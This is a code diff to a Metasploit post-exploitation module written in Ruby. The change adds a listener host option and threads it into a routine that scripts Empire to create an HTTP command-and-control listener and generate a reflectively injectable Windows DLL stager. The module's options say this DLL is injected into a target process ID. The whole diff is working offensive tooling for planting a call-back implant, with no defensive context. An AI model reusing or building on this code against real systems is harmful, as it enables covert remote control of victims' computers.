@@ -22,6 +22,7 @@ class MetasploitModule < Msf::Post
                      ))
     register_options(
       [
+        OptAddress.new('LHOST',[true, 'Host to start the listener on']),
         OptPort.new('LPORT',[false, 'Port for payload to connect to, make sure port is not already in use', 7878 ]),
         OptString.new('PathToEmpire', [true, 'The Complete Path to Empire-Web API']),
         OptInt.new('PID', [true,'Process Identifier to inject the Empire payload into'])
@@ -30,6 +31,7 @@ class MetasploitModule < Msf::Post
   def run
     #Storing user inputs.
     path = datastore['PathToEmpire'].to_s.chomp
+    @host = datastore['LHOST'].to_s
     @port = datastore['LPORT'].to_s
     @pid = datastore['PID'].to_i
 
@@ -47,7 +49,7 @@ class MetasploitModule < Msf::Post
 
     #method to create the reflectivly injectable DLL
     def create_DLL
-      generate_reflective_DLL('Listener_Emp_test3',@port)
+      generate_reflective_DLL('Listener_Emp_test3',@host, @port)
     end
 
     #main function
@@ -82,9 +84,9 @@ class MetasploitModule < Msf::Post
     end
 
     #method to generate reflective DLL from empire-cli
-    def generate_reflective_DLL(listener_name, port)
+    def generate_reflective_DLL(listener_name, host, port)
       dll = File.open('/root/dll_generator.rc',"w")
-      dll.puts ("listeners\nuselistener http\nset Name #{listener_name}\nset Port #{port}\nexecute\nlisteners\nusestager windows/dll\nset Listener #{listener_name}\nset OutFile /tmp/launcher-emp.dll\ngenerate")
+      dll.puts ("listeners\nuselistener http\nset Name #{listener_name}\nset Host #{host}\nset Port #{port}\nexecute\nlisteners\nusestager windows/dll\nset Listener #{listener_name}\nset OutFile /tmp/launcher-emp.dll\ngenerate")
       dll.close
       command = './empire --resource /root/dll_generator.rc > /dev/null'
       value = system(command)
